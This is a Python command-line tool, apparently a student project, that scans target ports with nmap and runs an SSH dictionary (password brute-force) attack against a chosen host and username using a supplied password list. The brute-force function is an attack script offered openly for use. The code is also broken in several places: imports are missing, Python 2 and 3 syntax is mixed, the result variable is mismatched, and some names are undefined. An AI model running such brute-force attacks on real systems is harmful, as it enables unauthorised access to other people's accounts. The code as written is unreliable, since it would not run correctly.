import click
import nmap
import json
import xmltodict
import paramiko

def nmapScan(tgthost, tgtport, js):
    try:
        nm = nmap.PortScanner()
    except nmap.PortScannerError:
        print('Nmap not found', sys.exc_info()[0])
        sys.exit(0)
    except:
        print("Unexpected error:", sys.exc_info()[0])
        sys.exit(0)
    if tgthost and tgtport and not js:
        nm.scan(tgthost, tgtport)
        state = nm[str(tgthost)]['tcp'][int(tgtport)]['state']
        print(" [*] " + tgthost + " tcp/"+tgtport +" " +state)
    if js:
        xml = nm.scan(tgthost, tgtport)
        print(json.dumps(xml))
        with open('nmap_output.xml', 'a+') as outfile:
            json.dump(xml, outfile)


def dictionAttck(tgthost, user, f):
    if not os.path.exists(f):
        print "\n[*] File Path Does Not Exist!"
        sys.exit(4)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    input_file = open(f)
    for i in input_file.readlines():
        password = i.strip("\n")
        try:
            code = 0
            response = ssh.connect(tgthost, port=22, username=user, password=password)
        except paramiko.AuthenticationException:
            code = 1
        except socket.error, e:
            code = 2
        ssh.close()
    if response == 0:
        print("%s[*] User: %s [*] Pass Found: %s%s" % (line, username, password, line))
        sys.exit(0)
    if response == 1:
        print("%s[*] User: %s [*] Pass: %s => Login Incorrect!" % (username, password))
    if response == 2:
        print("[*] Connection Could Not Be Established To Address: %s" % (host))
        sys.exit(2)

@click.group()
@click.pass_context
def main(self):
    """
    Tools created for a independent study project at Wentworth Institute of Technology.
    """
    pass

@main.command()
@click.option('--nmap', is_flag=True, help='Runs nmap scan')
@click.option('--tgthost', '-h', type=str, help='Target Host(s)', multiple=True)
@click.option('--tgtport', '-p', type=str, help='Target Port(s)', multiple=True)
@click.option('--js', '-j', is_flag=True, help='Outputs to json and creates a file in current directory')
@click.pass_context
def recon(self, nmap, tgthost, tgtport, js):
    """
    Runs an nmap scan on target host(s) and target port(s)
    """
    if nmap:
        if js:
            for tgthost in tgthost:
                for tgtport in tgtport:
                    nmapScan(tgthost,tgtport,js)
        if not js:
            for tgthost in tgthost:
                for tgtport in tgtport:
                    nmapScan(tgthost,tgtport,js)


@main.command()
@click.option('--tgthost', '-h', type=str, help='Target host')
@click.option('--user', '-u', type=str, help='Target SSH username')
@click.option('--diction', '-d', is_flag=True, help='Runs a dictionary attack on a host via SSH')
@click.option('-f', type=str, help='Password list file directory')
def bf(self, tgthost, user, diction, f):
    """
    Different Bruteforce mechanisms.
    * Dictionary Attack
    """
    if diction:
        dictionAttck(tgthost, user, f)


if __name__ == '__main__':
    main()
